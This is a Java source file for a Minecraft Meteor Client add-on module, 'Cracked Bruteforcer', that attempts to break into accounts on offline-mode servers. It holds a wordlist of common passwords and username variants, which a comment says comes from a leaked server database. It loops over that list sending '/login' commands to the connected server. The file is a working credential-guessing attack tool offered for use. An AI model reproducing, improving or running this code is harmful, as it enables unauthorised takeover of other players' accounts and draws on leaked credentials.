package com.crystaldevs.crystal.modules.misc;

import com.crystaldevs.crystal.utils.mc.McUtils;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.text.Text;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CrackedBruteforce extends Module {
    public static final List<String> passwords = new ArrayList<String>();
    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    public CrackedBruteforce() {
        super(Categories.Misc, "Cracked Bruteforcer", "CRYSTAL || Attempts to bruteforce the login on cracked servers.");

        // From a cracked anarchy server db leak

        String username = McUtils.getUsername();
        passwords.add(username);
        passwords.add(username + "1");
        passwords.add(username + "12");
        passwords.add(username + "123");
        passwords.add(username + "12345");
        passwords.add(username + "123456");
        passwords.add(username + "1234567");
        passwords.add("password");
        passwords.add("password123");
        passwords.add(username + "password");
        passwords.add(username + "_password");
        passwords.add(username + "_");
        passwords.add("qwerty");
        passwords.add("123456");
        passwords.add("123");
        passwords.add(username + "@");
        passwords.add(username + "@1");
        passwords.add(username.toLowerCase());
        passwords.add(username.toUpperCase());
        passwords.add("1234");
        passwords.add("qwertyuiop");
        passwords.add("123456789");
        passwords.add("PASSWORD");
        passwords.add("000000");
        passwords.add("123123");
        passwords.add("_" + username);
        passwords.add("fuckyou");
        passwords.add("fuckyou".toUpperCase());
        passwords.add("1q2w3e4r5t");
        passwords.add("password1");
        passwords.add("222222");
        passwords.add("qwerty123");
        passwords.add("computer");
        passwords.add("7777777");
        passwords.add("football");
        passwords.add("6b6t");
        passwords.add("8b8t");
        passwords.add("popbob");
        passwords.add("2b2t");
        passwords.add("stash");
        passwords.add(username + "_qwerty");
        passwords.add("__" + username);
        passwords.add(username + "__");
        passwords.add("1" + username);
        passwords.add("12" + username);
        passwords.add("123" + username);
        passwords.add("anarchy");
        passwords.add("dupe");
        passwords.add("glock");
        passwords.add("scam");
        passwords.add("getoutofmyaccount");
    }

    @EventHandler
    public void onActivate() {
        if (Utils.canUpdate()) {
            if (!mc.isInSingleplayer()) {
                if (mc.getCurrentServerEntry() != null) {
                    executor.execute(this::bruteforce);
                }
            } else {
                ChatUtils.sendMsg(Text.of("You must be logged into a server, toggling."));
                toggle();
            }
        }
    }

    public void bruteforce() {
        for (String pswd : passwords) {
            ChatUtils.sendPlayerMsg("/login " + pswd);
        }
    }

    @EventHandler
    public void onGameLeft() {

    }
}
